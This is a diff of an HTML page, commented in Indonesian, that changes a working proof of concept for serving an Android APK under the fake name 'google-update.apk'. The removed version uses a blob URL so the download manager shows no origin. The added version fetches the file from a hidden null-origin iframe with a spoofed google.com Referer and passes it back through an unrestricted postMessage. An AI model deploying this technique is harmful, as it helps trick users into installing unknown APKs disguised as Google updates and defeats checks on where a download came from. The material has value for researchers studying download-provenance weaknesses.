@@ -2,49 +2,73 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>Zero Origin APK Downloader 2025</title>
   <style>
-    body {font-family:Arial;text-align:center;padding:60px;background:#000;color:#0f0;}
-    button {padding:18px 40px;font-size:20px;background:#0f0;color:#000;border:none;border-radius:12px;cursor:pointer;}
-    #log {margin-top:20px;font-family:monospace;color:#0f0;}
+    .btn {
+      background:#4CAF50; color:white; padding:15px 32px; font-size:16px;
+      border:none; cursor:pointer; border-radius:8px; margin:20px;
+    }
   </style>
 </head>
 <body>
-  <h1>Zero Origin APK Downloader V2</h1>
-  <button onclick="download()">Download google-update.apk (Origin Hilang 100%)</button>
-  <div id="log">Status: Siap</div>
+  <center>
+    <h2>Download APK (Origin & Referer Spoofed)</h2>
+    <button class="btn" onclick="startDownload()">Download Update</button>
+    <div id="status">Status: Ready</div>
+  </center>
 
   <script>
-  async function download() {
-    document.getElementById('log').textContent = 'Status: Sedang memproses...';
+  function startDownload() {
+    document.getElementById('status').textContent = 'Status: Memulai...';
 
-    try {
-      // 1. Ambil APK dulu
-      const response = await fetch('https://aliothme.github.io/poc.apk');
-      if (!response.ok) throw new Error('Gagal fetch APK');
+    // 1. Buat iframe dengan origin null (data: URL)
+    const iframe = document.createElement('iframe');
+    iframe.style.display = 'none';
+    iframe.src = 'data:text/html,' + encodeURIComponent(`
+      <!DOCTYPE html>
+      <script>
+        // Kita sekarang berada di origin null → boleh spoof Referer!
+        async function doFetch() {
+          try {
+            const resp = await fetch('https://aliothme.github.io/poc.apk', {
+              referrer: 'https://www.google.com/',           // Paksa Referer header
+              referrerPolicy: 'unsafe-url',                  // Wajib untuk override
+              mode: 'cors',
+              credentials: 'omit'
+            });
 
-      const blob = await response.blob();
+            const blob = await resp.blob();
+            const url = URL.createObjectURL(blob);
 
-      // 2. Buat blob URL (ini yang bikin origin HILANG TOTAL)
-      const url = URL.createObjectURL(blob);
+            // Kirim blob URL kembali ke parent
+            parent.postMessage({ type: 'DOWNLOAD', url: url }, '*');
+          } catch(e) {
+            parent.postMessage({ type: 'ERROR', msg: e.message }, '*');
+          }
+        }
+        doFetch();
+      </script>
+    `);
+    document.body.appendChild(iframe);
 
-      // 3. Trigger download dengan nama palsu
-      const a = document.createElement('a');
-      a.href = url;
-      a.download = 'google-update.apk';  // Nama file yang muncul
-      document.body.appendChild(a);
-      a.click();
-      document.body.removeChild(a);
+    // 2. Terima blob dari iframe dan trigger download
+    window.addEventListener('message', function handler(e) {
+      if (e.data.type === 'DOWNLOAD') {
+        const a = document.createElement('a');
+        a.href = e.data.url;
+        a.download = 'google-update.apk';
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+        URL.revokeObjectURL(e.data.url);
 
-      // 4. Bersihkan
-      setTimeout(() => URL.revokeObjectURL(url), 100);
-
-      document.getElementById('log').innerHTML = 
-        '<strong>SUKSES!</strong><br>Origin di download manager: <span style="color:#ff0">KOSONG TOTAL</span><br>File: google-update.apk';
-
-    } catch(e) {
-      document.getElementById('log').textContent = 'Error: ' + e.message;
-    }
+        document.getElementById('status').textContent = 'Status: Download selesai! Cek Network → Referer = google.com';
+        window.removeEventListener('message', handler);
+        iframe.remove();
+      }
+      if (e.data.type === 'ERROR') {
+        document.getElementById('status').textContent = 'Status: Error - ' + e.data.msg;
+      }
+    });
   }
   </script>
 </body>
